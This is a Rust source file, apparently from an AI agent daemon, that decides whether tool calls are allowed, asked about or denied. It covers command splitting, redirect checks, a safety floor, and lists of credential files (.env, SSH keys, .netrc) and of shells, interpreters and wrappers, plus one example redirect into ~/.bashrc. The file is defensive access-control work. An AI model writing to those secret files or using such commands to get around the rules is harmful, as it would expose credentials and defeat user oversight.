//! Permission rules: allow, ask, or deny a tool call by tool name and an argument pattern (a
//! command prefix for `run_command`, a path glob for the file tools). Rules come from two
//! scopes, global and the session's environment, and are evaluated together:
//!
//! 1. Every rule whose tool and pattern match the call is collected.
//! 2. A matching environment rule overrides the matching global rules of equal specificity
//!    (same tool exactness and the same number of literal pattern characters).
//! 3. Of what is left, deny wins over ask, and ask over allow.
//!
//! No matching rule leaves the call to the tool's default (reads run, writes and commands ask).
//! A command line is split at `;`, `&&`, `||`, `|`, `&`, and newlines, and each part is matched
//! on its own: any part denied denies the line, any part asked asks, and the line is allowed only
//! when every part is. Allow rules with a pattern never match a line with command substitution
//! (`` ` ``, `$(`, `<(`, `>(`) or output redirection to a file, so `cargo test > ~/.bashrc` is not
//! allowed by `cargo test`. Rules are a convenience on top of the folder sandbox and isolation
//! tiers, not a sandbox of their own.

use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
use std::sync::{Arc, PoisonError, RwLock};

use imperium_api::{PathGrant, PermissionMode, PermissionRule, RuleAction};

/// The tool whose rule patterns are command prefixes.
pub const COMMAND_TOOL: &str = "run_command";

/// Longest tool name or pattern a rule may have.
const MAX_RULE_TEXT: usize = 500;

/// What a call is about, for matching rule patterns.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Target {
    /// A command line (`run_command`).
    Command(String),
    /// A file tool's path: absolute with `/` separators, and relative to the working directory
    /// when it lies inside it.
    Path {
        absolute: String,
        relative: Option<String>,
    },
    /// Any other tool: only rules without a pattern match.
    Other,
}

/// Rules that may change while sessions run: sessions hold the handle, so a change (such as
/// "always allow" from an approval) applies from their next call.
#[derive(Debug, Clone, Default)]
pub struct SharedRules(Arc<RwLock<Vec<PermissionRule>>>);

impl SharedRules {
    pub fn new(rules: Vec<PermissionRule>) -> Self {
        SharedRules(Arc::new(RwLock::new(rules)))
    }

    pub fn get(&self) -> Vec<PermissionRule> {
        self.0
            .read()
            .unwrap_or_else(PoisonError::into_inner)
            .clone()
    }

    pub fn set(&self, rules: Vec<PermissionRule>) {
        *self.0.write().unwrap_or_else(PoisonError::into_inner) = rules;
    }
}

/// A session's permission mode, shared by its agents so a change applies from their next call.
/// It also holds the session's "capped" count: while a turn the daemon started from text other
/// people wrote runs, every call that is not a read asks (see [`Permissions::judge`]).
#[derive(Debug, Clone, Default)]
pub struct SharedMode(
    Arc<RwLock<PermissionMode>>,
    Arc<AtomicUsize>,
    Arc<AtomicBool>,
);

impl SharedMode {
    pub fn new(mode: PermissionMode) -> Self {
        SharedMode(Arc::new(RwLock::new(mode)), Arc::default(), Arc::default())
    }

    /// Whether a capped turn is running (any number of holders), or the session is capped for
    /// its whole life.
    pub fn is_capped(&self) -> bool {
        self.1.load(Ordering::SeqCst) > 0 || self.2.load(Ordering::SeqCst)
    }

    /// Caps the session for its whole life: nothing lifts it.
    pub fn cap_for_life(&self) {
        self.2.store(true, Ordering::SeqCst);
    }

    /// Whether the session is capped for its whole life.
    pub fn is_standing(&self) -> bool {
        self.2.load(Ordering::SeqCst)
    }

    pub fn cap(&self) {
        self.1.fetch_add(1, Ordering::SeqCst);
    }

    /// Starts a cap only when none is held, as one step: false when another holder has one.
    pub fn try_cap(&self) -> bool {
        self.1
            .compare_exchange(0, 1, Ordering::SeqCst, Ordering::SeqCst)
            .is_ok()
    }

    pub fn uncap(&self) {
        let mut current = self.1.load(Ordering::SeqCst);
        while current > 0 {
            match self
                .1
                .compare_exchange(current, current - 1, Ordering::SeqCst, Ordering::SeqCst)
            {
                Ok(_) => break,
                Err(now) => current = now,
            }
        }
    }

    pub fn get(&self) -> PermissionMode {
        *self.0.read().unwrap_or_else(PoisonError::into_inner)
    }

    pub fn set(&self, mode: PermissionMode) {
        *self.0.write().unwrap_or_else(PoisonError::into_inner) = mode;
    }
}

/// A session's rules: the global ones and its environment's, and its permission mode.
#[derive(Debug, Clone, Default)]
pub struct Permissions {
    pub global: SharedRules,
    pub environment: SharedRules,
    pub mode: SharedMode,
    /// Rules fixed for the session when it started, counted with its environment's: the ask
    /// and deny rules of the environment's own configuration file.
    fixed: Vec<PermissionRule>,
}

impl PartialEq for Permissions {
    fn eq(&self, other: &Self) -> bool {
        Arc::ptr_eq(&self.global.0, &other.global.0)
            && Arc::ptr_eq(&self.environment.0, &other.environment.0)
            && Arc::ptr_eq(&self.mode.0, &other.mode.0)
            && self.fixed == other.fixed
    }
}

impl Eq for Permissions {}

impl Permissions {
    pub fn new(global: SharedRules, environment: SharedRules) -> Self {
        Permissions {
            global,
            environment,
            mode: SharedMode::default(),
            fixed: Vec::new(),
        }
    }

    /// The same rules with `rules` added for this session. They are evaluated apart from the
    /// global and environment rules and the stronger action wins, so a fixed `ask` never
    /// weakens a `deny`.
    pub fn with_fixed_rules(self, rules: Vec<PermissionRule>) -> Self {
        Permissions {
            fixed: rules,
            ..self
        }
    }

    /// The same rules, starting in `mode` (a handle of its own, not shared with `self`).
    pub fn with_mode(self, mode: PermissionMode) -> Self {
        Permissions {
            mode: SharedMode::new(mode),
            ..self
        }
    }

    /// What the rules say about a call to `tool` on `target`; `None` when no rule matches.
    pub fn evaluate(&self, tool: &str, target: &Target) -> Option<RuleAction> {
        let own = evaluate(&self.global.get(), &self.environment.get(), tool, target);
        if self.fixed.is_empty() {
            return own;
        }
        // The fixed rules are not subject to "an environment rule overrides a global one of equal
        // specificity": they only add to what the user's rules say, so they can make a call
        // ask or deny but never undo the user's deny.
        own.max(evaluate(&[], &self.fixed, tool, target))
    }

    /// Whether any rule could ask about or deny something, so callers can skip per-file checks
    /// without.
    pub fn has_ask_or_deny_rules(&self) -> bool {
        self.global
            .get()
            .iter()
            .chain(self.environment.get().iter())
            .chain(self.fixed.iter())
            .any(|rule| rule.action != RuleAction::Allow)
    }

    /// The session's permission mode now.
    pub fn mode(&self) -> PermissionMode {
        self.mode.get()
    }

    /// Judges a call to `tool` on `target` of kind `kind`: what the rules say, whether the
    /// safety floor covers it, and what the mode then makes of both ([`decide_call`]). The floor
    /// is [`safety_floor`] of the call unless the caller knows better and gives `floor_override`
    /// (a provider tool that asks every time is a floored call).
    pub fn judge(
        &self,
        tool: &str,
        target: &Target,
        kind: CallKind,
        floor_override: Option<bool>,
    ) -> Judgement {
        let rule = self.evaluate(tool, target);
        // Writing the user's own configuration is refused before anyone is asked.
        if kind == CallKind::Edit
            && let Target::Path { absolute, .. } = target
            && refused_write(absolute)
        {
            return Judgement {
                decision: Decision::Refuse(Refusal::Configuration),
                rule,
                floored: true,
            };
        }
        let floored = floor_override.unwrap_or_else(|| safety_floor(kind, target));
        let mut decision = decide_call(self.mode(), kind, rule, floored);
        let mut floored = floored;
        // A capped turn asks for everything but a read, whatever the tool's default is (web
        // search and fetch, browser, MCP and extension tools on an allow list, ...) and
        // whatever rules, session approvals or pre-approval say. Deny rules and plan mode
        // still refuse.
        if self.is_capped()
            && kind != CallKind::Read
            && matches!(decision, Decision::Run | Decision::Ask { .. })
        {
            decision = Decision::Ask { sticky: false };
            // Like the safety floor: a tool the session was started with pre-approved, and the
            // auto-mode classifier, do not settle it.
            floored = true;
        }
        Judgement {
            decision,
            rule,
            floored,
        }
    }

    /// Whether a capped turn is running, or the session is capped for its whole life.
    pub fn is_capped(&self) -> bool {
        self.mode.is_capped()
    }

    /// Caps the session for its whole life (a session started from text other people wrote).
    pub fn cap_for_life(&self) {
        self.mode.cap_for_life();
    }

    /// Whether the session is capped for its whole life.
    pub fn is_standing(&self) -> bool {
        self.mode.is_standing()
    }

    /// Starts a capped turn: until the matching [`Self::uncap`], every call but a read asks.
    pub fn cap(&self) {
        self.mode.cap();
    }

    pub fn uncap(&self) {
        self.mode.uncap();
    }

    /// Like [`Self::cap`], but only when no cap is held; whether it was taken.
    pub fn try_cap(&self) -> bool {
        self.mode.try_cap()
    }

    /// Changes the session's permission mode from its agents' next calls on.
    pub fn set_mode(&self, mode: PermissionMode) {
        self.mode.set(mode);
    }
}

/// What a call does, for the permission mode.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CallKind {
    /// Reads, listings, searches: never changes anything.
    Read,
    /// Creates or changes files (`write_file`, `edit_file`).
    Edit,
    /// Runs a command.
    Execute,
    /// Another tool (MCP, web, browser, media, app config): `asks` is whether it asks by default.
    Other { asks: bool },
}

/// How [`Permissions::judge`] judged a call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Judgement {
    /// What happens to the call.
    pub decision: Decision,
    /// What the rules said about it, if any matched.
    pub rule: Option<RuleAction>,
    /// Whether the safety floor covered it: its approval is asked for every time.
    pub floored: bool,
}

/// What happens to a call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// Runs without asking.
    Run,
    /// Asks the user. With `sticky`, a tool the user allowed for the session runs without
    /// asking again; without it (ask-every-time mode, the safety floor) it asks every time.
    Ask { sticky: bool },
    /// Refused without asking.
    Refuse(Refusal),
}

/// Why a call was refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Refusal {
    /// A deny rule matched.
    Rule,
    /// The session is in plan mode, which only reads.
    Plan,
    /// A file tool would write what the daemon loads as the user's own configuration
    /// ([`refuse_writes_under`]): refused in every mode, whatever a rule or an answer says.
    Configuration,
}

/// How a call is decided from the session's mode, the matching rules' action (`rule`), and
/// whether the built-in safety floor covers it (`floor`, see [`safety_floor`]).
///
/// Deny rules win in every mode. Plan mode refuses edits, commands, and tools that would ask.
/// The safety floor asks (every time) in every other mode, whatever the allow rules say. Ask
/// rules ask every time in every mode, even for a tool allowed for the session; otherwise:
///
/// | Mode | Read | Edit | Execute | Other tools |
/// |---|---|---|---|---|
/// | `ask` | runs | asks every time | asks every time | ask every time if they ask by default |
/// | `default` | runs | allow rule or ask | allow rule or ask | allow rule, else their default |
/// | `auto` | as `default` | as `default` | as `default` | as `default` |
/// | `accept_edits` | runs | runs | allow rule or ask | allow rule, else their default |
/// | `plan` | runs | refused | refused | refused if they would ask |
/// | `full` | runs | runs | runs | run |
///
/// `auto` decides exactly as `default` does: the classifier that makes it different lives in the
/// engine and sees only a call this function says would ask with `sticky` set (never a floored
/// call, an ask rule's call, or a refusal), so nothing it says can reach a call that must ask.
pub fn decide_call(
    mode: PermissionMode,
    kind: CallKind,
    rule: Option<RuleAction>,
    floor: bool,
) -> Decision {
    if rule == Some(RuleAction::Deny) {
        return Decision::Refuse(Refusal::Rule);
    }
    let asks_by_default = match kind {
        CallKind::Read => false,
        CallKind::Edit | CallKind::Execute => true,
        CallKind::Other { asks } => asks,
    };
    // An ask rule asks every time: an "always this session" approval does not lift it.
    let ask_rule = rule == Some(RuleAction::Ask);
    if mode == PermissionMode::Plan {
        return if kind == CallKind::Read || !(asks_by_default || ask_rule) {
            if ask_rule {
                Decision::Ask { sticky: false }
            } else {
                Decision::Run
            }
        } else {
            Decision::Refuse(Refusal::Plan)
        };
    }
    if (floor && kind != CallKind::Read) || ask_rule {
        return Decision::Ask { sticky: false };
    }
    let allowed = rule == Some(RuleAction::Allow);
    let ask = match mode {
        PermissionMode::Ask => {
            return if asks_by_default {
                Decision::Ask { sticky: false }
            } else {
                Decision::Run
            };
        }
        PermissionMode::Full => false,
        PermissionMode::AcceptEdits if kind == CallKind::Edit => false,
        _ => asks_by_default && !allowed,
    };
    if ask {
        Decision::Ask { sticky: true }
    } else {
        Decision::Run
    }
}

/// Folders the daemon asks the floor to guard, as normalised text (see [`protect_dir`]).
static PROTECTED_DIRS: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

fn normalise_dir(path: &str) -> String {
    let path = path.replace('\\', "/");
    let path = path.strip_prefix("//?/").unwrap_or(&path);
    let path = path.trim_end_matches('/');
    if cfg!(any(windows, target_os = "macos")) {
        path.to_lowercase()
    } else {
        path.to_string()
    }
}

/// Makes writing under `dir` something the safety floor always asks about, like a `.git`
/// folder: the daemon uses it for the user's installed mods, whose files are what an approval
/// vouches for. A process-wide list (every daemon in the process adds its own folders).
///
/// Both the path as given and the one it resolves to (its nearest existing ancestor made
/// canonical, the rest appended, as the file tools resolve a path) are guarded, so a folder
/// reached through a symbolic link, a junction, an 8.3 name or a redirected config folder is
/// still covered.
pub fn protect_dir(dir: &std::path::Path) {
    register(&PROTECTED_DIRS, dir);
}

/// Adds `path` as given and as it resolves (see [`protect_dir`]) to `list`.
fn register(list: &std::sync::Mutex<Vec<String>>, path: &std::path::Path) {
    let mut forms = vec![normalise_dir(&path.to_string_lossy())];
    if let Some(resolved) = resolved_form(path) {
        forms.push(normalise_dir(&resolved.to_string_lossy()));
    }
    let mut entries = list.lock().unwrap_or_else(PoisonError::into_inner);
    for form in forms {
        if !form.is_empty() && !entries.contains(&form) {
            entries.push(form);
        }
    }
}

/// Folders and files the file tools refuse to write, whatever the mode, rules or answers. The
/// list is process-wide and de-duplicated: every daemon in the process adds its own paths, a path
/// added twice (as given and as it resolves) is kept once, and nothing removes one.
static REFUSED_WRITES: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

/// Makes `write_file` and `edit_file` refuse (not ask) any write to `path`, or under it when it
/// is a folder: the daemon uses it for what it loads as the user's own and runs or follows,
/// the user's skills, agents, commands, mods and plugins folders and `config.toml`. A write there
/// would plant an extension no one approved. Both the path as given and the one it resolves to
/// are refused, as for [`protect_dir`]. A process-wide list.
pub fn refuse_writes_under(path: &std::path::Path) {
    register(&REFUSED_WRITES, path);
}

/// Whether a write to `absolute` is refused ([`refuse_writes_under`]). Compared folded both ways
/// (lower and upper case), as the workspace compares its configuration files: some file systems
/// fold `ſ` to `S`, which lowercasing alone does not undo.
pub fn refused_write(absolute: &str) -> bool {
    let path = normalise_dir(absolute);
    let upper = path.to_uppercase();
    let under = |path: &str, entry: &str| path == entry || path.starts_with(&format!("{entry}/"));
    REFUSED_WRITES
        .lock()
        .unwrap_or_else(PoisonError::into_inner)
        .iter()
        .any(|entry| {
            under(&path, entry)
                || (cfg!(any(windows, target_os = "macos")) && under(&upper, &entry.to_uppercase()))
        })
}

/// Whether `absolute` is a file a project uses to add extensions or change what the daemon
/// starts for it: `.imperium/` or `.claude/` `skills`, `commands` or `agents`, `.mcp.json`, and
/// `.imperium/config.toml` or `config.local.toml` (they can add plugin folders and MCP servers).
/// Matched by name wherever the project is, after the folding the workspace's configuration-file
/// check does (case both ways, no `:stream`, no trailing dots or spaces), so no spelling of
/// one slips by; over-matching is harmless, a write there only asks.
pub fn project_extension_file(absolute: &str) -> bool {
    // Tidied without touching the file system: `.` and `..` parts are resolved lexically, so
    // `.claude/./skills` and `.claude/sub/../skills` are `.claude/skills`. A part is what it is
    // before any `:stream` and without trailing dots or spaces (`..` itself is read first).
    let mut parts: Vec<String> = Vec::new();
    for part in absolute.split('/').filter(|part| !part.is_empty()) {
        match part {
            "." => {}
            ".." => {
                parts.pop();
            }
            _ => {
                let name = part.split(':').next().unwrap_or_default();
                parts.push(name.trim_end_matches(['.', ' ']).to_string());
            }
        }
    }
    let is = |name: &str, want: &str| {
        name.to_lowercase() == want || name.to_uppercase() == want.to_uppercase()
    };
    if parts.last().is_some_and(|last| is(last, ".mcp.json")) {
        return true;
    }
    // A plugin's code-running parts, whenever its folder was registered: `hooks/hooks.json`, and
    // anything in a `.claude-plugin` folder (its manifest, which can point hooks and servers
    // anywhere).
    if parts
        .windows(2)
        .any(|pair| is(&pair[0], "hooks") && is(&pair[1], "hooks.json"))
        || parts
            .iter()
            .take(parts.len().saturating_sub(1))
            .any(|part| is(part, ".claude-plugin"))
    {
        return true;
    }
    parts.windows(2).any(|pair| {
        let (folder, name) = (&pair[0], &pair[1]);
        let tool_folder = is(folder, ".imperium") || is(folder, ".claude");
        (tool_folder
            && ["skills", "commands", "agents"]
                .iter()
                .any(|want| is(name, want)))
            || (is(folder, ".imperium")
                && ["config.toml", "config.local.toml"]
                    .iter()
                    .any(|want| is(name, want)))
    })
}

/// What a file tool tells the agent when a write is refused ([`refused_write`]).
pub const REFUSED_WRITE_ADVICE: &str = "this path holds what Imperium loads as the user's own configuration (skills, plugins, mods, agents, commands, config.toml), so file tools never write there, in any permission mode. To add a skill, plugin or mod use install_extension, which asks the user and then needs their approval in the Imperium desktop app; to change the configuration, ask the user to do it in the app";

/// `path` with its nearest existing ancestor canonicalised and the missing rest appended.
fn resolved_form(path: &std::path::Path) -> Option<std::path::PathBuf> {
    let mut existing = path;
    let mut missing = Vec::new();
    while !existing.exists() {
        missing.push(existing.file_name()?.to_owned());
        existing = existing.parent()?;
    }
    let mut resolved = existing.canonicalize().ok()?;
    for name in missing.into_iter().rev() {
        resolved.push(name);
    }
    Some(resolved)
}

fn in_protected_dir(absolute: &str) -> bool {
    let path = normalise_dir(absolute);
    PROTECTED_DIRS
        .lock()
        .unwrap_or_else(PoisonError::into_inner)
        .iter()
        .any(|dir| path == *dir || path.starts_with(&format!("{dir}/")))
}

/// Built-in ask rules for writing files that hold secrets.
const FLOOR_PATHS: &[&str] = &[
    ".env",
    ".env.*",
    "*.pem",
    "*.key",
    "id_rsa*",
    "id_ed25519*",
    "id_ecdsa*",
    ".npmrc",
    ".pypirc",
    ".netrc",
    // The daemon's record of which mod permissions the user approved.
    "mod-approvals.json",
    // The daemon's records of installed plugins and their approvals, the marker that says the
    // first-start migration ran, and its cache of what each marketplace lists.
    "plugin-installs.json",
    "skill-installs.json",
    "plugin-migration.json",
    "marketplaces.json",
    // The encrypted secret file used where there is no OS keychain, and its scratch files
    // (`secrets.key` is already covered by `*.key`).
    "secrets.enc",
    "secrets.*.tmp",
    "secrets.lock",
    // Which secret store the daemon uses; the CLI follows it.
    "secrets.backend",
];

/// Whether the built-in safety floor covers a call: a destructive command (see
/// [`crate::floor`]), or writing a file that holds secrets or lies under any `.git` folder
/// (a repository's own, or a linked worktree's main repository's). Reads are never covered.
///
/// The floor is a best-effort guard against an agent's mistakes, not a security boundary: it
/// reads the command line, unwrapping common shells and wrappers, but cannot see what a script
/// or program does.
pub fn safety_floor(kind: CallKind, target: &Target) -> bool {
    match (kind, target) {
        (CallKind::Execute, Target::Command(line)) => crate::floor::dangerous_command(line),
        (CallKind::Edit, Target::Path { absolute, .. }) => {
            let fold = cfg!(any(windows, target_os = "macos"));
            let in_git = absolute.split('/').any(|part| {
                if fold {
                    part.eq_ignore_ascii_case(".git")
                } else {
                    part == ".git"
                }
            });
            in_git
                || project_extension_file(absolute)
                || in_protected_dir(absolute)
                || FLOOR_PATHS.iter().any(|pattern| {
                    path_matches(pattern, absolute, None)
                        || (fold && path_matches(pattern, &absolute.to_lowercase(), None))
                })
        }
        _ => false,
    }
}

/// What `global` and `environment` rules say about a call to `tool` on `target`.
pub fn evaluate(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    tool: &str,
    target: &Target,
) -> Option<RuleAction> {
    match target {
        Target::Command(line) => evaluate_command(global, environment, tool, line),
        _ => decide(global, environment, |rule| rule_matches(rule, tool, target)),
    }
}

/// The strongest action among the matching rules, after environment rules override global
/// rules of equal specificity.
fn decide(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    matches: impl Fn(&PermissionRule) -> bool,
) -> Option<RuleAction> {
    let local: Vec<&PermissionRule> = environment.iter().filter(|rule| matches(rule)).collect();
    let overridden = |rule: &PermissionRule| {
        local
            .iter()
            .any(|own| specificity(own) == specificity(rule))
    };
    local
        .iter()
        .copied()
        .chain(
            global
                .iter()
                .filter(|rule| matches(rule) && !overridden(rule)),
        )
        .map(|rule| rule.action)
        .max()
}

/// How specific a rule is: an exact tool name beats a wildcard, then more literal pattern
/// characters beat fewer.
fn specificity(rule: &PermissionRule) -> (bool, usize) {
    let pattern = rule.pattern.trim();
    (
        !rule.tool.contains('*'),
        pattern.chars().filter(|c| !matches!(c, '*' | '?')).count(),
    )
}

fn patternless(rule: &PermissionRule) -> bool {
    matches!(rule.pattern.trim(), "" | "*" | "**")
}

fn tool_matches(rule: &PermissionRule, tool: &str) -> bool {
    let wanted = rule.tool.trim();
    wanted == "*" || glob(wanted, tool, false)
}

fn rule_matches(rule: &PermissionRule, tool: &str, target: &Target) -> bool {
    if !tool_matches(rule, tool) {
        return false;
    }
    if patternless(rule) {
        return true;
    }
    match target {
        Target::Path { absolute, relative } => {
            path_matches(&rule.pattern, absolute, relative.as_deref())
        }
        Target::Command(line) => prefix_matches(&rule.pattern, &command_words(line)),
        Target::Other => false,
    }
}

fn evaluate_command(
    global: &[PermissionRule],
    environment: &[PermissionRule],
    tool: &str,
    line: &str,
) -> Option<RuleAction> {
    let risky = risky(line);
    let pieces = split_command(line);
    if pieces.is_empty() {
        return decide(global, environment, |rule| {
            tool_matches(rule, tool) && patternless(rule)
        });
    }
    let mut decisions = Vec::with_capacity(pieces.len());
    for piece in &pieces {
        let words = command_words(piece);
        decisions.push(decide(global, environment, |rule| {
            if !tool_matches(rule, tool) {
                return false;
            }
            if patternless(rule) {
                return true;
            }
            if risky && rule.action == RuleAction::Allow {
                return false;
            }
            // An allow rule that would run any code (`run_command python`, `sudo`, `npx`) is
            // not applied: the call asks as if the rule were not there.
            if over_broad_rule(rule).is_some() {
                return false;
            }
            prefix_matches(&rule.pattern, &words)
        }));
    }
    if decisions.contains(&Some(RuleAction::Deny)) {
        Some(RuleAction::Deny)
    } else if decisions.contains(&Some(RuleAction::Ask)) {
        Some(RuleAction::Ask)
    } else if decisions.iter().all(|d| *d == Some(RuleAction::Allow)) {
        Some(RuleAction::Allow)
    } else {
        None
    }
}

/// Redirections that only merge or discard output, removed before a line is split.
const HARMLESS_REDIRECTS: &[&str] = &[
    "2>&1",
    "1>&2",
    ">&2",
    ">&1",
    "2>/dev/null",
    ">/dev/null",
    "2> /dev/null",
    "> /dev/null",
    "2>nul",
    ">nul",
    "2>NUL",
    ">NUL",
];

/// `line` with each harmless redirect replaced by a space. A redirect counts only as a whole
/// token: when a file-name character follows it (`>nul.sh`, `>&1out`, `>/dev/null/../x`) it
/// names a file, so it stays in the line for [`risky`] to see.
fn without_harmless_redirects(line: &str) -> String {
    let mut stripped = String::with_capacity(line.len());
    let mut rest = line;
    while let Some(next) = rest.chars().next() {
        let harmless = HARMLESS_REDIRECTS
            .iter()
            .find(|redirect| rest.starts_with(**redirect) && ends_word(&rest[redirect.len()..]));
        if let Some(redirect) = harmless {
            stripped.push(' ');
            rest = &rest[redirect.len()..];
        } else {
            stripped.push(next);
            rest = &rest[next.len_utf8()..];
        }
    }
    stripped
}

/// Whether `after` starts a new word or command (or is empty), rather than continuing a name.
fn ends_word(after: &str) -> bool {
    after
        .chars()
        .next()
        .is_none_or(|next| next.is_whitespace() || matches!(next, ';' | '&' | '|'))
}

/// Whether the line substitutes commands or redirects output into a file.
fn risky(line: &str) -> bool {
    let line = without_harmless_redirects(line);
    ["`", "$(", "<(", ">("].iter().any(|s| line.contains(s)) || line.contains('>')
}

/// The line's commands, split at `;`, `&&`, `||`, `|`, `&`, and newlines. Quotes are not
/// parsed: a separator inside quotes still splits, which only makes rules stricter.
pub(crate) fn split_command(line: &str) -> Vec<String> {
    without_harmless_redirects(line)
        .split([';', '&', '|', '\n', '\r'])
        .map(str::trim)
        .filter(|piece| !piece.is_empty())
        .map(str::to_string)
        .collect()
}

/// A command's words, without leading `NAME=value` assignments; the program is reduced to its
/// file name without `.exe`, `.cmd`, or `.bat` (and lower-cased on Windows), so `/bin/rm` and
/// `RM.EXE` are `rm` there.
fn command_words(command: &str) -> Vec<String> {
    let mut words: Vec<String> = command
        .split_whitespace()
        .skip_while(|word| is_assignment(word))
        .map(str::to_string)
        .collect();
    if let Some(first) = words.first_mut() {
        *first = program_name(first);
    }
    words
}

fn is_assignment(word: &str) -> bool {
    word.split_once('=').is_some_and(|(name, _)| {
        !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

fn program_name(word: &str) -> String {
    let word = word.trim_matches(|c| c == '"' || c == '\'');
    let name = word.rsplit(['/', '\\']).next().unwrap_or(word);
    let lower = name.to_ascii_lowercase();
    let name = [".exe", ".cmd", ".bat"]
        .iter()
        .find(|suffix| lower.ends_with(*suffix))
        .map_or(name, |suffix| &name[..name.len() - suffix.len()]);
    if cfg!(windows) {
        name.to_ascii_lowercase()
    } else {
        name.to_string()
    }
}

/// Whether `pattern`'s words start `words`. A pattern word may use `*` and `?`; a final `*`
/// word matches the rest of the line, including nothing.
fn prefix_matches(pattern: &str, words: &[String]) -> bool {
    let wanted = command_words(pattern);
    let wanted = match wanted.split_last() {
        Some((last, rest)) if last == "*" => rest,
        _ => wanted.as_slice(),
    };
    if wanted.len() > words.len() {
        return false;
    }
    wanted
        .iter()
        .zip(words)
        .all(|(want, word)| glob(want, word, false))
}

/// The home folder, for `~` in grants and patterns: `HOME`, else `USERPROFILE`, as text; a value
/// that is blank after trimming counts as unset and non-UTF-8 values are ignored. Not the same as
/// the workflow crate's `home_dir`, which returns a path and only treats an empty value as unset.
pub fn home_dir() -> Option<String> {
    ["HOME", "USERPROFILE"]
        .iter()
        .filter_map(|name| std::env::var(name).ok())
        .find(|home| !home.trim().is_empty())
}

/// `path` with a leading `~` replaced by the home folder.
pub fn expand_home(path: &str) -> String {
    let path = path.trim();
    let rest = match path.strip_prefix('~') {
        Some(rest) if rest.is_empty() || rest.starts_with(['/', '\\']) => rest,
        _ => return path.to_string(),
    };
    match home_dir() {
        Some(home) => format!("{}{rest}", home.trim_end_matches(['/', '\\'])),
        None => path.to_string(),
    }
}

fn is_absolute_pattern(pattern: &str) -> bool {
    let bytes = pattern.as_bytes();
    pattern.starts_with('/')
        || (bytes.len() >= 2 && bytes[0].is_ascii_alphabetic() && bytes[1] == b':')
}

/// Whether a path glob matches a file tool's path. A pattern without `/` matches the file name
/// at any depth (`.env`, `*.pem`); an absolute pattern (or one starting with `~`) matches the
/// absolute path; any other pattern matches the path relative to the working directory. `*` and
/// `?` stay within one path segment, `**` crosses segments, and `dir/**` also matches `dir`.
/// Matching ignores case on Windows.
fn path_matches(pattern: &str, absolute: &str, relative: Option<&str>) -> bool {
    let pattern = expand_home(pattern).replace('\\', "/");
    let pattern = pattern.trim().trim_start_matches("./");
    let fold = cfg!(windows);
    let try_match = |text: &str| {
        glob(pattern, text, fold)
            || pattern
                .strip_suffix("/**")
                .is_some_and(|dir| glob(dir, text, fold))
    };
    if !pattern.contains('/') {
        let name = absolute.rsplit('/').next().unwrap_or(absolute);
        return try_match(name);
    }
    if is_absolute_pattern(pattern) {
        return try_match(absolute);
    }
    relative.is_some_and(try_match)
}

/// Glob matching: `**` matches anything, `*` anything but `/`, `?` one character but `/`.
pub fn glob(pattern: &str, text: &str, fold: bool) -> bool {
    let normalize = |s: &str| -> Vec<char> {
        if fold {
            s.chars().flat_map(char::to_lowercase).collect()
        } else {
            s.chars().collect()
        }
    };
    let pattern = normalize(pattern);
    let text = normalize(text);
    // matches[i][j]: pattern[i..] matches text[j..].
    let (p, t) = (pattern.len(), text.len());
    let mut matches = vec![vec![false; t + 1]; p + 1];
    matches[p][t] = true;
    for i in (0..p).rev() {
        let double = pattern[i] == '*' && pattern.get(i + 1) == Some(&'*');
        for j in (0..=t).rev() {
            matches[i][j] = match pattern[i] {
                '*' if double => {
                    // `**` (and a following `/`, so `a/**/b` matches `a/b`) matches any run.
                    let next = if pattern.get(i + 2) == Some(&'/') {
                        i + 3
                    } else {
                        i + 2
                    };
                    matches[i + 2][j]
                        || (next != i + 2 && matches[next][j])
                        || (j < t && matches[i][j + 1])
                }
                '*' => {
                    // The second star of a `**` is handled by the first.
                    if i > 0 && pattern[i - 1] == '*' {
                        matches[i + 1][j]
                    } else {
                        matches[i + 1][j] || (j < t && text[j] != '/' && matches[i][j + 1])
                    }
                }
                '?' => j < t && text[j] != '/' && matches[i + 1][j + 1],
                c => j < t && text[j] == c && matches[i + 1][j + 1],
            };
        }
    }
    matches[0][0]
}

/// The rule "always allow" would add for a call: the program and its subcommand for a simple
/// command line (none for a line with several commands, substitution, or redirection), the
/// file's folder for a file tool, and the whole tool otherwise. No rule is offered for a
/// command whose rule would run any code: an interpreter, a shell, a runner such as `npx` or
/// `cargo run`, or a wrapper such as `env` or `sudo` that runs whatever follows it
/// ([`over_broad_command`]).
pub fn suggest(tool: &str, target: &Target) -> Option<PermissionRule> {
    let pattern = match target {
        Target::Command(line) => {
            if risky(line) || split_command(line).len() != 1 {
                return None;
            }
            let words = command_words(line);
            let first = words.first()?;
            let mut pattern = first.clone();
            if let Some(second) = words.get(1)
                && second.len() <= 30
                && second
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == ':')
                && !second.starts_with('-')
            {
                pattern.push(' ');
                pattern.push_str(second);
            }
            if over_broad_command(&pattern).is_some() {
                return None;
            }
            pattern
        }
        Target::Path { absolute, .. } => {
            let folder = absolute.rsplit_once('/').map_or("", |(folder, _)| folder);
            if folder.is_empty() {
                return None;
            }
            format!("{folder}/**")
        }
        Target::Other => String::new(),
    };
    Some(PermissionRule {
        tool: tool.to_string(),
        pattern,
        action: RuleAction::Allow,
    })
}

/// Programs that run whatever command follows them, so a rule naming one allows every command.
const WRAPPERS: &[&str] = &[
    "env", "sudo", "doas", "nohup", "timeout", "nice", "ionice", "xargs", "time", "command",
    "exec", "stdbuf", "setsid", "runas",
];

/// Interpreters and shells: a rule naming one allows any code they are given.
const INTERPRETERS: &[&str] = &[
    "python",
    "python3",
    "python2",
    "pythonw",
    "py",
    "node",
    "deno",
    "bun",
    "bunx",
    "ruby",
    "perl",
    "php",
    "bash",
    "sh",
    "zsh",
    "fish",
    "dash",
    "ksh",
    "pwsh",
    "powershell",
    "cmd",
    "npx",
    "uvx",
    "pipx",
    "java",
    "dotnet",
    "osascript",
    "wscript",
    "cscript",
    "mshta",
];

